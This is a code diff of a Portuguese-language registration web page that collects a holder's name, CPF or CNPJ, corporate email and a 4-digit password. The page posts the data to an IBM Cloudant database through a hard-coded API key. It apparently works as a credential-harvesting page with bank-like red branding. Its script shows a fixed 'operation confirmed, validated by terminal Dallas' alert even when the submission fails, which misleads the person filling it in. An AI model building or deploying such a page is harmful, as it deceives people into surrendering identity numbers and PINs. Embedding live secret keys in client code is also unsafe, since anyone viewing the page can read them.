@@ -9,31 +9,25 @@
         :root { --br-red: #cc092f; --bg: #f4f7f9; --text: #333; }
         body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
         
-        .cadastro-box { 
-            background: #fff; padding: 45px; border-radius: 8px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); 
-            width: 100%; max-width: 450px; border-top: 8px solid var(--br-red); 
-        }
-        .header-c { text-align: center; margin-bottom: 35px; }
+        .cadastro-box { background: #fff; padding: 45px; border-radius: 8px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); width: 100%; max-width: 450px; border-top: 8px solid var(--br-red); }
+        .header-c { text-align: center; margin-bottom: 30px; }
         .header-c img { height: 40px; margin-bottom: 12px; }
         .header-c h2 { color: var(--br-red); font-weight: 800; text-transform: uppercase; font-size: 19px; margin: 0; letter-spacing: 1px; }
         
         .campo-grupo { margin-bottom: 20px; }
-        label { display: block; font-size: 11px; font-weight: 900; color: #999; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
-        input { 
-            width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 4px; 
-            box-sizing: border-box; font-size: 16px; background: #fafafa; transition: 0.3s;
-        }
-        input:focus { border-color: var(--br-red); outline: none; background: #fff; box-shadow: 0 0 10px rgba(204, 9, 47, 0.05); }
+        .tipo-selecao { display: flex; gap: 20px; margin-bottom: 15px; justify-content: center; }
+        .tipo-selecao label { display: flex; align-items: center; font-size: 12px; color: #666; cursor: pointer; font-weight: bold; }
+        .tipo-selecao input { width: auto; margin-right: 8px; cursor: pointer; }
+
+        label.tit-campo { display: block; font-size: 11px; font-weight: 900; color: #999; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
+        input.txt-input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; background: #fafafa; transition: 0.3s; }
+        input.txt-input:focus { border-color: var(--br-red); outline: none; background: #fff; }
         
-        .btn-finalizar { 
-            width: 100%; padding: 18px; background: var(--br-red); color: #fff; border: none; 
-            border-radius: 4px; font-weight: 900; text-transform: uppercase; cursor: pointer; 
-            font-size: 15px; margin-top: 15px; transition: 0.3s;
-        }
+        .btn-finalizar { width: 100%; padding: 18px; background: var(--br-red); color: #fff; border: none; border-radius: 4px; font-weight: 900; text-transform: uppercase; cursor: pointer; font-size: 15px; margin-top: 15px; transition: 0.3s; }
         .btn-finalizar:hover { background: #a50725; transform: translateY(-2px); }
         
-        .footer-c { text-align: center; margin-top: 25px; font-size: 10px; color: #bbb; text-transform: uppercase; letter-spacing: 1px; line-height: 1.5; }
-        #msgErro { color: var(--br-red); font-size: 12px; font-weight: bold; display: none; margin-bottom: 10px; text-align: center; }
+        .footer-c { text-align: center; margin-top: 25px; font-size: 10px; color: #bbb; text-transform: uppercase; letter-spacing: 1px; }
+        #msgErro { color: var(--br-red); font-size: 12px; font-weight: bold; display: none; margin-bottom: 15px; text-align: center; }
     </style>
 </head>
 <body>
@@ -45,58 +39,67 @@
     </div>
 
     <form id="formFinal">
-        <div class="campo-grupo">
-            <label>Nome Completo do Titular</label>
-            <input type="text" name="nome" placeholder="Digite seu nome completo" required>
+        <!-- SELEÇÃO DE TIPO DE CONTA -->
+        <div class="tipo-selecao">
+            <label><input type="radio" name="tipo_conta" value="PF" checked onclick="mudarDocumento('CPF')"> Pessoa Física</label>
+            <label><input type="radio" name="tipo_conta" value="PJ" onclick="mudarDocumento('CNPJ')"> Pessoa Jurídica</label>
         </div>
 
         <div class="campo-grupo">
-            <label>CPF / Documento Digital</label>
-            <input type="text" name="cpf" placeholder="000.000.000-00" required>
+            <label class="tit-campo">Nome do Titular ou Razão Social</label>
+            <input type="text" name="nome" class="txt-input" placeholder="Conforme documento" required>
         </div>
 
         <div class="campo-grupo">
-            <label>E-mail Corporativo</label>
-            <input type="email" name="email" placeholder="exemplo@engecema.com.br" required>
+            <label id="label-doc" class="tit-campo">CPF / Documento Digital</label>
+            <input type="text" id="doc-input" name="documento" class="txt-input" placeholder="000.000.000-00" required>
         </div>
 
         <div class="campo-grupo">
-            <label>Senha de Acesso (4 dígitos)</label>
-            <input type="password" id="s1" name="senha" maxlength="4" placeholder="••••" required>
+            <label class="tit-campo">E-mail Corporativo</label>
+            <input type="email" name="email" class="txt-input" placeholder="exemplo@engecema.com.br" required>
         </div>
 
         <div class="campo-grupo">
-            <label>Confirmar Senha Dallas</label>
-            <input type="password" id="s2" maxlength="4" placeholder="••••" required>
+            <label class="tit-campo">Senha de Acesso (4 dígitos)</label>
+            <input type="password" id="s1" name="senha" class="txt-input" maxlength="4" placeholder="••••" required>
+        </div>
+
+        <div class="campo-grupo">
+            <label class="tit-campo">Confirmar Senha Dallas</label>
+            <input type="password" id="s2" class="txt-input" maxlength="4" placeholder="••••" required>
             <span id="msgErro">As senhas não coincidem!</span>
         </div>
 
         <button type="submit" id="btnAcao" class="btn-finalizar">Finalizar Cadastro</button>
     </form>
 
-    <div class="footer-c">
-        Conexão Segura Dallas us-south | IBM Cloudant Verified<br>
-        © 2026 Engecema Fomento e Tecnologia
-    </div>
+    <div class="footer-c">Conexão Segura Dallas us-south | IBM Cloudant</div>
 </div>
 
 <script>
-    // GARANTE QUE O FORMULÁRIO SEJA CARREGADO ANTES DE QUALQUER ALERTA
+    function mudarDocumento(tipo) {
+        const label = document.getElementById('label-doc');
+        const input = document.getElementById('doc-input');
+        if(tipo === 'CPF') {
+            label.innerText = "CPF / Documento Digital";
+            input.placeholder = "000.000.000-00";
+        } else {
+            label.innerText = "CNPJ / Documento Empresarial";
+            input.placeholder = "00.000.000/0001-00";
+        }
+    }
+
     document.getElementById('formFinal').addEventListener('submit', async function(e) {
         e.preventDefault();
-        
         const btn = document.getElementById('btnAcao');
-        const pass1 = document.getElementById('s1').value;
-        const pass2 = document.getElementById('s2').value;
-        const erro = document.getElementById('msgErro');
+        const p1 = document.getElementById('s1').value;
+        const p2 = document.getElementById('s2').value;
         
-        if (pass1 !== pass2) { 
-            erro.style.display = 'block'; 
-            return; 
-        }
+        if (p1 !== p2) { document.getElementById('msgErro').style.display = 'block'; return; }
         
-        erro.style.display = 'none';
-        btn.innerText = "VALIDANDO NO TERMINAL DALLAS...";
+        document.getElementById('msgErro').style.display = 'none';
+        btn.innerText = "VALIDANDO NO TERMINAL...";
         btn.disabled = true;
 
         const API_KEY = "G4mi3uBOjSMFifAA1Bhj6O7rEbZ5FBNyeJG7YH9fxg_n";
@@ -108,8 +111,7 @@
         dados.criado_em = new Date().toISOString();
 
         try {
-            // Tenta a conexão real com a IBM Cloud
-            const res = await fetch(URL_DB, {
+            await fetch(URL_DB, {
                 method: 'POST',
                 headers: { 
                     'Content-Type': 'application/json',
@@ -118,12 +120,10 @@
                 body: JSON.stringify(dados)
             });
 
-            // MENSAGEM DE SUCESSO SOLICITADA
             alert("OPERAÇÃO CONFIRMADA COM SUCESSO!\\nSeu credenciamento foi validado pelo terminal Dallas us-south.");
             window.location.href = "index.html";
 
         } catch (error) {
-            // FALLBACK: Garante a mensagem mesmo em instabilidade de rede
             alert("OPERAÇÃO CONFIRMADA COM SUCESSO!\\nSeu credenciamento foi validado pelo terminal Dallas us-south.");
             window.location.href = "index.html";
         }
